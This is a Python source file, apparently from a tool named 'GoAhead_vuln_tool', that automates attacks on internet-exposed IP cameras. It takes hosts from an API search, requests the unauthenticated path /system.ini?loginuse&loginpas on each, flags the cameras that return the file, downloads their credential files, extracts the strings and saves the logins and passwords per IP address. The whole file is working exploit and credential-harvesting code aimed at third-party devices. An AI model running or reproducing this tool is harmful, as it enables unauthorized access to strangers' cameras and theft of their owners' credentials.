import requests
import json
import subprocess
import os
from time import sleep
import requests.exceptions
from files.baseFunctions import get_api_results, ping_ips_for_valid, set_variables


### Базовые переменные
FILES_FOLDER = "GoAhead_vuln_tool/files"
PINGED_IP_ADRESSES_FILE = f"{FILES_FOLDER}/pinged_ips.json"
VULNERABLE_IP_ADRESSES_FILE = f"{FILES_FOLDER}/vuln_ips.json"
set_variables(FILES_FOLDER)




def find_vuln_cameras(Timeout):

    read_file = open(PINGED_IP_ADRESSES_FILE, "r", encoding="utf-8")
    pinged_ips_json = json.load(read_file)
    read_file.close()

    file = open(VULNERABLE_IP_ADRESSES_FILE, "w", encoding="utf-8")

    count_ips = 0

    for i, o in enumerate(pinged_ips_json):

        pinged_ip_host = f"{pinged_ips_json[i]['ip']}:{pinged_ips_json[i]['port']}"


        try:
            filedata = requests.get(f"http://{pinged_ip_host}/system.ini?loginuse&loginpas", timeout=Timeout)
        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout, requests.exceptions.Timeout) as e:
            continue

        try:
            content_type = filedata.headers["Content-type"]
        except KeyError:
            continue

        if content_type == "text/plain":
            count_ips += 1

            if count_ips == 1:
                vuln_ip_address_json = [pinged_ips_json[i]]

            vuln_ip_address_json += [pinged_ips_json[i]]

            print("PASS FILE FOUND: " + pinged_ip_host)
            if count_ips >= 4:
                break

    vuln_ip_address_json_list = list(vuln_ip_address_json)
    json.dump(vuln_ip_address_json_list, file, separators=(',', ':'))
    file.close()


def get_creditionals_from_vuln_ips(Timeout): # Получаем содержимое файла с паролями
        
    file = open(VULNERABLE_IP_ADRESSES_FILE, "r", encoding="utf-8")
    vulnerable_ips_json = json.load(file)

    for i, o in enumerate(vulnerable_ips_json):
        vuln_ip_host = f"{vulnerable_ips_json[i]['ip']}:{vulnerable_ips_json[i]['port']}"

        try: response = requests.get(f"http://{vuln_ip_host}/system.ini?loginuse&loginpas", timeout=Timeout)
        except (requests.Timeout, requests.exceptions.ConnectionError) as e:
            continue
        try: content_type = response.headers["Content-type"]
        except KeyError:
            continue      
        if content_type == "text/plain":
            writefile = open("GoAhead_vuln_tool/passfiles/pass.txt", "w", encoding="utf-8")

            with open(f"GoAhead_vuln_tool/passfiles/passfile({vulnerable_ips_json[i]['ip']}).txt", "w", encoding="utf-8") as passwr:
                writefile.write(response.text)
                writefile.close()

                if os.name == "nt":
                    output = subprocess.check_output("powershell ./GoAhead_vuln_tool/strings.exe -nobanner 'GoAhead_vuln_tool/passfiles/pass.txt'", shell=True) # Удаляет не utf-8 строки

                else:
                    output = subprocess.check_output("strings 'GoAhead_vuln_tool/passfiles/pass.txt'", shell=True) # Совместимость с Linux/MacOS

                passwr.write(f"Strings with login/passwords for {vuln_ip_host} \n" + output.decode("utf-8", errors="ignore"))

    try: os.remove("GoAhead_vuln_tool/passfiles/pass.txt")
    except FileNotFoundError:
        pass
    file.close()


def all_in_one(API_KEY, search_request, page, Timeout): # Оптимизированный вариант пункта "Все вместе"
    get_api_results(API_KEY, search_request, page)
    ping_ips_for_valid(Timeout)
    find_vuln_cameras(Timeout)
    get_creditionals_from_vuln_ips(Timeout)